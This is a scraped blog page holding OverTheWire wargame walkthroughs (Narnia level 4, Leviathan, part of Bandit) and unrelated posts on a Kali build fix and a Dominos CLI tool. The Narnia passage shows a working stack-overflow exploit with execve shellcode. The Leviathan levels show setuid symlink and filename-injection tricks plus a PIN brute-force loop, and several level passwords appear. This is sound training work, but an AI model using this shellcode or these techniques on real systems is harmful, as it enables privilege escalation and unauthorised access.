Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
</pre></div>
</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia4@melinda:/narnia$ gdb -q ./narnia4 
Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4
Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3
Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x316a4130 in ?? ()
</pre></div>
</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">local $] ./pattern.py 0x316a4130
Pattern 0x316a4130 first occurrence at position 272 in pattern.
</pre></div>
</p>

<p>This tells us we have 272 bytes to play with. Plenty of space to construct
a nopsled and shellcode payload. Let&rsquo;s find out what we need to write into
<code>EIP</code>.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;a&#39;*272 + &#39;bbbb&#39;&quot;)
Starting program: /games/narnia/narnia4 $(python -c &quot;print &#39;a&#39;*272 + &#39;bbbb&#39;&quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
0xffffd5c0:	0x00000000	0xffffd654	0xffffd660	0xf7feacea
0xffffd5d0:	0x00000002	0xffffd654	0xffffd5f4	0x080497cc
0xffffd5e0:	0x0804825c	0xf7fca000	0x00000000	0x00000000
0xffffd5f0:	0x00000000	0x7cc8a421	0x44f76031	0x00000000
0xffffd600:	0x00000000	0x00000000	0x00000002	0x080483b0
0xffffd610:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd620:	0x00000002	0x080483b0	0x00000000	0x080483d1
0xffffd630:	0x080484ad	0x00000002	0xffffd654	0x08048550
0xffffd640:	0x080485c0	0xf7feb180	0xffffd64c	0x0000001c
0xffffd650:	0x00000002	0xffffd78f	0xffffd7a5	0x00000000
0xffffd660:	0xffffd8ba	0xffffd8ce	0xffffd8de	0xffffd8f1
0xffffd670:	0xffffd914	0xffffd927	0xffffd930	0xffffd93d
0xffffd680:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
0xffffd690:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd6a0:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd6b0:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd6c0:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
0xffffd6d0:	0x00000010	0x1f898b75	0x00000006	0x00001000
0xffffd6e0:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd6f0:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd700:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd710:	0x00000009	0x080483b0	0x0000000b	0x000036b4
0xffffd720:	0x0000000c	0x000036b4	0x0000000d	0x000036b4
0xffffd730:	0x0000000e	0x000036b4	0x00000017	0x00000000
0xffffd740:	0x00000019	0xffffd76b	0x0000001f	0xffffdfe2
0xffffd750:	0x0000000f	0xffffd77b	0x00000000	0x00000000
0xffffd760:	0x00000000	0x00000000	0x9e000000	0x9213cb6c
0xffffd770:	0x8eef41b1	0xe0574cc7	0x69a73659	0x00363836
0xffffd780:	0x00000000	0x00000000	0x00000000	0x2f000000
0xffffd790:	0x656d6167	0x616e2f73	0x61696e72	0x72616e2f
0xffffd7a0:	0x3461696e	0x61616100	0x61616161	0x61616161
0xffffd7b0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7d0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd800:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd810:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd820:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8b0:	0x61616161	0x62626261	0x00000062	0x00000000
0xffffd8c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8d0:	0x00000000	0x00000000	0x00000000	0x00000000
</pre></div>
</p>

<p>Our input starts at around <em>0xffffd7a8</em> so let&rsquo;s get going writing our payload.
Create a nopsled that is <em>272 - 25</em> bytes long, follow that with the
the same shellcode as before, and finish with an address that sits comfortably
in the sled. You normally need to play with the address a bit, as the offsets
inside <em>gdb</em> are a bit different.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia4@melinda:/narnia$ ./narnia4 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;\x90&#39;*(272-25) + &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&#39; + &#39;\x30\xd8\xff\xff&#39;&quot;`</span>
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
[password]
</pre></div>
</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/03/25/fix-kali-live-build-error/">
        Fix Kali Live Build error
      </a>
    </h1>

    <span class="post-date">Wed, Mar 25, 2015</span>

    <p>I was trying out the Kali Linux live build, and ran into an an issue where
the <code>lb build</code> command would throw an error: <code>chroot: failed to run command '/usr/bin/env': No such file or directory</code></p>

<p>Turns out this is a Debian bug that&rsquo;s been around since 2013. Luckily the fix
is straightforward. First follow the usual <a href="http://docs.kali.org/development/live-build-a-custom-kali-iso">live build instructions</a>
and then make sure the <a href="http://docs.kali.org/general-use/kali-linux-sources-list-repositories">Kali repo sources are set</a>.</p>

<p>Now in order to fix the issue we follow the instructions provided in
<a href="https://bugs.kali.org/view.php?id=270">this bug report</a>. I&rsquo;ll write it down here,
in case I need to refer back to it later. I&rsquo;ve also updated the version of
the <code>libdebian-installer</code> package to the latest available at this time.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">apt-get remove --purge libdebian-installer4
wget http://ftp.debian.org/debian/pool/main/libd/libdebian-installer/libdebian-installer_0.99.tar.xz
tar xvf libdebian-installer_0.99.tar.xz
cd libdebian-installer-0.99
grep -R parser_rfc822 src
apt-get install automake libtool
autoreconf -i -v
./configure
make
make install
git clone git://git.kali.org/live-build-config.git
cd live-build-config/
lb config
lb build
</pre></div>


<p>After this the build ran fine.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/03/23/solving-leviathan/">
        Solving Leviathan
      </a>
    </h1>

    <span class="post-date">Mon, Mar 23, 2015</span>

    

<p>After having done <a href="http://overthewire.org/wargames/bandit/">Bandit</a>, let&rsquo;s move
on to <a href="http://overthewire.org/wargames/leviathan/">Leviathan</a>. None of the levels
have hints, so there won&rsquo;t be any links to each of the levels.</p>

<p>Without further ado, let&rsquo;s get cracking.</p>

<h1 id="level-0-1:233d21a5a4a7da288bb6120215cbabbb">Level 0 -&gt; 1</h1>

<p>Logging in with <code>leviathan0:leviathan0</code> we take a quick look around to see
what we have to work with, if anything</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan0@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root       root       4096 Nov 14 10:32 .
drwxr-xr-x 167 root       root       4096 Mar 21 06:46 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Feb 10 18:08 .backup
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
</pre></div>


<p>Let&rsquo;s take a look in that <code>.backup</code> folder.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan0@melinda:~$ ls .backup/
bookmarks.html
</pre></div>


<p>Checking the contents of the file, we see it really is a list of bookmarks.
Going on the assumption that the password for the next level is in there, let&rsquo;s
grep for <em>leviathan</em> in this file</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan0@melinda:~$ grep leviathan .backup/bookmarks.html 
&lt;DT&gt;&lt;A HREF=&quot;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&quot; ADD_DATE=&quot;1155384634&quot; LAST_CHARSET=&quot;ISO-8859-1&quot; ID=&quot;rdf:#$2wIU71&quot;&gt;password to leviathan1&lt;/A&gt;
</pre></div>


<p>And there it is</p>

<h1 id="level-1-2:233d21a5a4a7da288bb6120215cbabbb">Level 1 -&gt; 2</h1>

<p>As usual we login, do a <code>ls -la</code> and see a <code>check</code> binary that is setuid <code>leviathan2</code>.
Let&rsquo;s run it and see what happens</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan1@melinda:~$ ./check 
password: test
Wrong password, Good Bye ...
</pre></div>


<p>Trying the usual <code>strings check</code> shows us a couple of interesting strings: <code>secret</code> and <code>love</code>.
Neither one or both will return success. Hrmm. Ok, let&rsquo;s take a look at the
disassembly</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) disass main
Dump of assembler code for function main:
   0x0804852d &lt;+0&gt;:	push   %ebp
   0x0804852e &lt;+1&gt;:	mov    %esp,%ebp
   0x08048530 &lt;+3&gt;:	and    $0xfffffff0,%esp
   0x08048533 &lt;+6&gt;:	sub    $0x30,%esp
   0x08048536 &lt;+9&gt;:	mov    %gs:0x14,%eax
   0x0804853c &lt;+15&gt;:	mov    %eax,0x2c(%esp)
   0x08048540 &lt;+19&gt;:	xor    %eax,%eax
   0x08048542 &lt;+21&gt;:	movl   $0x786573,0x18(%esp)
   0x0804854a &lt;+29&gt;:	movl   $0x72636573,0x25(%esp)
   0x08048552 &lt;+37&gt;:	movw   $0x7465,0x29(%esp)
   0x08048559 &lt;+44&gt;:	movb   $0x0,0x2b(%esp)
   0x0804855e &lt;+49&gt;:	movl   $0x646f67,0x1c(%esp)
   0x08048566 &lt;+57&gt;:	movl   $0x65766f6c,0x20(%esp)
   0x0804856e &lt;+65&gt;:	movb   $0x0,0x24(%esp)
   0x08048573 &lt;+70&gt;:	movl   $0x8048680,(%esp)
   0x0804857a &lt;+77&gt;:	call   0x80483c0 &lt;printf@plt&gt;
   0x0804857f &lt;+82&gt;:	call   0x80483d0 &lt;getchar@plt&gt;
   0x08048584 &lt;+87&gt;:	mov    %al,0x14(%esp)
   0x08048588 &lt;+91&gt;:	call   0x80483d0 &lt;getchar@plt&gt;
   0x0804858d &lt;+96&gt;:	mov    %al,0x15(%esp)
   0x08048591 &lt;+100&gt;:	call   0x80483d0 &lt;getchar@plt&gt;
   0x08048596 &lt;+105&gt;:	mov    %al,0x16(%esp)
   0x0804859a &lt;+109&gt;:	movb   $0x0,0x17(%esp)
   0x0804859f &lt;+114&gt;:	lea    0x18(%esp),%eax
   0x080485a3 &lt;+118&gt;:	mov    %eax,0x4(%esp)
   0x080485a7 &lt;+122&gt;:	lea    0x14(%esp),%eax
   0x080485ab &lt;+126&gt;:	mov    %eax,(%esp)
   0x080485ae &lt;+129&gt;:	call   0x80483b0 &lt;strcmp@plt&gt;
   0x080485b3 &lt;+134&gt;:	test   %eax,%eax
   0x080485b5 &lt;+136&gt;:	jne    0x80485c5 &lt;main+152&gt;
   0x080485b7 &lt;+138&gt;:	movl   $0x804868b,(%esp)
   0x080485be &lt;+145&gt;:	call   0x8048400 &lt;system@plt&gt;
   0x080485c3 &lt;+150&gt;:	jmp    0x80485d1 &lt;main+164&gt;
   0x080485c5 &lt;+152&gt;:	movl   $0x8048693,(%esp)
   0x080485cc &lt;+159&gt;:	call   0x80483f0 &lt;puts@plt&gt;
   0x080485d1 &lt;+164&gt;:	mov    $0x0,%eax
   0x080485d6 &lt;+169&gt;:	mov    0x2c(%esp),%edx
   0x080485da &lt;+173&gt;:	xor    %gs:0x14,%edx
   0x080485e1 &lt;+180&gt;:	je     0x80485e8 &lt;main+187&gt;
   0x080485e3 &lt;+182&gt;:	call   0x80483e0 &lt;__stack_chk_fail@plt&gt;
   0x080485e8 &lt;+187&gt;:	leave  
   0x080485e9 &lt;+188&gt;:	ret    
End of assembler dump.
</pre></div>


<p>So it uses <code>strcmp</code> to compare our input to whatever the right pass is (<code>0x080485ae</code>)
I&rsquo;m going to use <code>ltrace</code> to trace through the library call and see what that reveals</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan1@melinda:~$ ltrace ./check 
__libc_start_main(0x804852d, 1, 0xffffd794, 0x80485f0 &lt;unfinished ...&gt;
printf(&quot;password: &quot;)                                       = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: test
)               = 116
getchar(0x8048680, 47, 0x804a000, 0x8048642)               = 101
getchar(0x8048680, 47, 0x804a000, 0x8048642)               = 115
strcmp(&quot;tes&quot;, &quot;sex&quot;)                                       = 1
puts(&quot;Wrong password, Good Bye ...&quot;Wrong password, Good Bye ...
)                       = 29
+++ exited (status 0) +++
</pre></div>


<p>And there we have it.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan1@melinda:~$ ./check 
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
</pre></div>
</p>

<h1 id="level-2-3:233d21a5a4a7da288bb6120215cbabbb">Level 2 -&gt; 3</h1>

<p>This time we are given a file called <code>printfile</code> that is setuid <code>leviathan3</code>.
Initially you&rsquo;d think we can just print the contents of the <code>leviathan3</code> password
file. Nope, there&rsquo;s a check in the binary preventing us from doing so.</p>

<p>Let&rsquo;s find out what that check is with <code>ltrace</code> once again</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan2@melinda:~$ ltrace ./printfile /tmp/unlogic
__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &lt;unfinished ...&gt;
access(&quot;/tmp/unlogic&quot;, 4)                                  = 0
snprintf(&quot;/bin/cat /tmp/unlogic&quot;, 511, &quot;/bin/cat %s&quot;, &quot;/tmp/unlogic&quot;) = 21
system(&quot;/bin/cat /tmp/unlogic&quot;testing
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                     = 0
+++ exited (status 0) +++
</pre></div>
</p>

<p>We can see that it checks access to the file, then runs <code>cat</code> on the file if it&rsquo;s
ok for us to access it. Symlinks won&rsquo;t work here, as the <code>access</code> call dereferences
the symlink. So what can we do? We exploit spaces. By creating a file that is a symlink to
the <code>leviathan3</code> password file, along with another file, that has the same name followed
by a space and another name, we can trick <code>access</code> into allowing it to carry on, and
then <code>cat</code> to print the files. let me show you</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/levpass3
leviathan2@melinda:~$ touch /tmp/levpass3<span style="color: #ae81ff">\ </span>other
leviathan2@melinda:~$ ./printfile /tmp/levpass3<span style="color: #ae81ff">\ </span>other
Ahdiemoo1j
/bin/cat: other: No such file or directory
</pre></div>
</p>

<p>So access checks <code>/tmp/levpass3\ other</code> and deems it ok. Then that string gets
passed to <code>cat</code> which interprets it as two files, hence the <code>/bin/cat: other: No such file or directory</code></p>

<h1 id="level-3-4:233d21a5a4a7da288bb6120215cbabbb">Level 3 -&gt; 4</h1>

<p>Another program that prompts for a pass. Usual approaches of <code>strings</code> and checking
the <em>disass</em> doesn&rsquo;t reveal much, but the function <code>do_stuff</code> does call <code>strcmp</code>
and we know now that we can use <code>ltrace</code> to help us out</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan3@melinda:~$ ltrace ./level3 
__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &lt;unfinished ...&gt;
strcmp(&quot;h0no33&quot;, &quot;kakaka&quot;)                                 = -1
printf(&quot;Enter the password&gt; &quot;)                             = 20
fgets(Enter the password&gt; d
&quot;d\n&quot;, 256, 0xf7fcac20)                              = 0xffffd58c
strcmp(&quot;d\n&quot;, &quot;snlprintf\n&quot;)                               = -1
puts(&quot;bzzzzzzzzap. WRONG&quot;bzzzzzzzzap. WRONG
)                                 = 19
+++ exited (status 0) +++
</pre></div>
</p>

<p>A little bit of obfuscation here, but to our keen eyes, we see where the test
is happening <code>strcmp(&quot;d\n&quot;, &quot;snlprintf\n&quot;)</code>. Our password is <code>snlprintf</code>.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan3@melinda:~$ ./level3 
Enter the password&gt; snlprintf  
[You&#39;ve got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
</pre></div>
</p>

<h1 id="level-4-5:233d21a5a4a7da288bb6120215cbabbb">Level 4 -&gt; 5</h1>

<p>Inside the hidden directory (you always run <code>ls -la</code>, right?) we have a bin file.
It&rsquo;s executable, so let&rsquo;s run it</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan4@melinda:~$ ./.trash/bin 
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
</pre></div>
</p>

<p>I&rsquo;m guessing we need to decode that from the current binary encoded string to text. This
gives us <code>Tith4cokei</code>. Testing it out takes us to</p>

<h1 id="level-5-6:233d21a5a4a7da288bb6120215cbabbb">Level 5 -&gt; 6</h1>

<p>We have a binary called <code>leviathan5</code> that is suid <code>leviathan6</code>. Upon running it,
we get a message that file <code>tmp/file.log</code> cannot be found. If you create one, it
will open it, print its contents, close it, and then delete it. So let&rsquo;s give the
old symlink method a try:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@melinda:~$ ./leviathan5 
UgaoFee4li
</pre></div>
</p>

<p>Result.</p>

<h1 id="level-6-7:233d21a5a4a7da288bb6120215cbabbb">Level 6 -&gt; 7</h1>

<p>We need a 4 digit pass code to access this. I opted for brute force. For 4 digits
that&rsquo;s by far the simplest and quickest way. After looking at the disassembly, we
see that it will call <code>/bin/sh</code> and drop us to a shell, so we don&rsquo;t need an exit condition.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan6@melinda:~$ <span style="color: #66d9ef">for</span> i in <span style="color: #66d9ef">$(</span>seq -f <span style="color: #e6db74">&quot;%04g&quot;</span> <span style="color: #ae81ff">0</span> 9999<span style="color: #66d9ef">)</span><span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">do</span> <span style="color: #f8f8f2">echo</span> <span style="color: #f8f8f2">$i</span> <span style="color: #f92672">&amp;&amp;</span> ./leviathan6 <span style="color: #f8f8f2">$i</span> &gt; /dev/null<span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">done</span>
0000
0001
.
.
7123
</pre></div>

It stops there. Because we redirect to /dev/null, we need to ctrl+c and then enter
the last printed number to get the password</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">leviathan6@melinda:~$ ./leviathan6  7123
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
</pre></div>
</p>

<p>The final flag for level 7 is</p>

<pre><code>Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)  
</code></pre>

<p>I understand the reasons, but this is not the only write up out there, and it is a fairly old
wargame too. IMO I feel that providing these walkthroughs will help those who are stuck.
If you are however just following this so that you can complete Leviathan, then you should
sit down and have a go at this, or other war games without a guide. Challenge yourself.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/03/15/dominos-cli-update/">
        Dominos CLI Update
      </a>
    </h1>

    <span class="post-date">Sun, Mar 15, 2015</span>

    <p>Small update on some progress and changes. Setting the store is now done by
enetering your postcode and the nearest delivery store to that postcode is
automatically selected. Setting the address also works and isn&rsquo;t just a stub,
and finally it is also able to determine if cash on delivery is available to you,
albeit at the end of the process, but that&rsquo;s how they do it.</p>

<script type="text/javascript" src="https://asciinema.org/a/17706.js" id="asciicast-17706" async></script>

<p>So the API is coming along and the CLI interface (which is mostly just a proof
of concept for the API) is also shaping up. Once cash on delivery orders are working
I reckon it&rsquo;s time to release it. Then work on investigating how credit card orders
are handled will start.</p>

<p>It&rsquo;s a fun, fairly pointless, and interesting ride :)</p>

<p><a href="https://github.com/Svenito/dominos">Now on Github</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1/">
        Let&#39;s crack Bandit Part 1
      </a>
    </h1>

    <span class="post-date">Fri, Mar 13, 2015</span>

    

<p>Let&rsquo;s give Bandit from the <a href="http://overthewire.org/wargames">overthewire war games</a>
a going over. I did this a while back, but never really wrote it up,
so I&rsquo;m going to do it again and write it up. Remember that you can copy
and paste from all the <a href="https://asciinema.org">asciinema</a> videos below.</p>

<p>Bandit is a CTF/wargame for beginners and a great intro to various
linux tools as well. I won&rsquo;t repeat the level summary for each post, instead
there&rsquo;s a link to the original page for each section.</p>

<p>I&rsquo;d be interested to know if the asciinema files are preferable over the
plain text format or not. Let me know in the comments below. I&rsquo;ve used
asciinema in the first level only, but would post the asciinema vids if they
are useful.</p>

<p><section id="table-of-contents" class="toc">
<header>
<h3>Contents</h3>
</header>
<div id="drawer" markdown="1">
*  Auto generated table of contents
{:toc}
</div>
</section><!-- /#table-of-contents --></p>

<h1 id="level-0-1:c0b338e2f736b59776da7641378921cf">Level 0 -&gt; 1</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit1.html">level 00</a></p>

<p>Not much to do here but login and read a file so:</p>

<script type="text/javascript" src="https://asciinema.org/a/17664.js" id="asciicast-17664" async></script>

<h1 id="level-1-2:c0b338e2f736b59776da7641378921cf">Level 1 -&gt; 2</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit2.html">level 01</a></p>

<p>Using the password from the last session, let&rsquo;s login and look at what&rsquo;s in
<code>-</code>. The trick here is that <code>-</code> is a bit tricky to pass as an argument. Try
it to see what happens. All we need to do it prefix it with the path:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit1@melinda:~$ ls -la
total 24
-rw-r-----   1 bandit2 bandit1   33 Jun  6  2013 -
drwxr-xr-x   2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 160 root    root    4096 Oct 17  2013 ..
-rw-r--r--   1 root    root     220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root    root    3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root    root     675 Apr  3  2012 .profile
bandit1@melinda:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
</pre></div>


<h1 id="level-2-3:c0b338e2f736b59776da7641378921cf">Level 2 -&gt; 3</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit3.html">level 02</a></p>

<p>Not much trickiness here, merely the spaces in the filename. But with TAB
completion the escaping of the spaces will be handled for us:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit2@melinda:~$ ls -la
total 24
drwxr-xr-x   2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 160 root    root    4096 Oct 17  2013 ..
-rw-r--r--   1 root    root     220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root    root    3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root    root     675 Apr  3  2012 .profile
-rw-r-----   1 bandit3 bandit2   33 Jun  6  2013 spaces in this filename
bandit2@melinda:~$ cat ./spaces<span style="color: #ae81ff">\ </span>in<span style="color: #ae81ff">\ </span>this<span style="color: #ae81ff">\ </span>filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
</pre></div>


<h1 id="level-3-4:c0b338e2f736b59776da7641378921cf">Level 3 -&gt; 4</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit4.html">level 03</a></p>

<p>Hidden file? Just do a long listing with <code>ls -la</code></p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit3@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root root 4096 Jun  6  2013 .
drwxr-xr-x 160 root root 4096 Oct 17  2013 ..
-rw-r--r--   1 root root  220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root root 3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root root  675 Apr  3  2012 .profile
drwxr-xr-x   2 root root 4096 Jun  6  2013 inhere
bandit3@melinda:~$ <span style="color: #f8f8f2">cd </span>inhere/
bandit3@melinda:~/inhere$ ls
bandit3@melinda:~/inhere$ ls -la
total 12
drwxr-xr-x 2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 3 root    root    4096 Jun  6  2013 ..
-rw-r----- 1 bandit4 bandit3   33 Jun  6  2013 .hidden
bandit3@melinda:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
</pre></div>


<h1 id="level-4-5:c0b338e2f736b59776da7641378921cf">Level 4 -&gt; 5</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit5.html">level 04</a></p>

<p>We need to find a human readable file in the <code>inhere</code> directory. Using the
power of bash:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit4@melinda:~$ <span style="color: #f8f8f2">cd </span>inhere/
bandit4@melinda:~/inhere$ <span style="color: #66d9ef">for</span> f in <span style="color: #66d9ef">$(</span>ls<span style="color: #66d9ef">)</span><span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">do</span> file ./<span style="color: #e6db74">${</span><span style="color: #f8f8f2">f</span><span style="color: #e6db74">}</span><span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">done</span>
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data
bandit4@melinda:~/inhere$ cat ./-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
</pre></div>


<p>Change into the <code>inhere</code> directory and then for each file returned by the <code>ls</code>
command, get the filetype with the <code>file</code> command. Only one which is ASCII, so
that&rsquo;s a good candidate. Sure enough, it&rsquo;s the one we are after.</p>

<h1 id="level-5-6:c0b338e2f736b59776da7641378921cf">Level 5 -&gt; 6</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit6.html">level 05</a></p>

<p>This is similar to the previous level, except now we are looking for something
with a specific size. Luckily the <code>find</code> command is just right for this:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit5@melinda:~$ find ./ -size 1033c
./inhere/maybehere07/.file2
bandit5@melinda:~$ file ./inhere/maybehere07/.file2
./inhere/maybehere07/.file2: ASCII text, with very long lines
bandit5@melinda:~$ cat !<span style="color: #960050; background-color: #1e0010">$</span>
cat ./inhere/maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
</pre></div>


<h1 id="level-6-7:c0b338e2f736b59776da7641378921cf">Level 6 -&gt; 7</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit7.html">level 06</a></p>

<p>Now we need to broaden our search. Once again <code>find</code> to the rescue. We know
the user and group that own the file and its size. The user and group might
be enough already, so let&rsquo;s give that a go</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">bandit6@melinda:~$ <span style="color: #f8f8f2">cd</span> /
bandit6@melinda:/$ find -user bandit7 -group bandit6  2&gt; /dev/null 
./var/lib/dpkg/info/bandit7.password
bandit6@melinda:/$ cat ./var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
</pre></div>


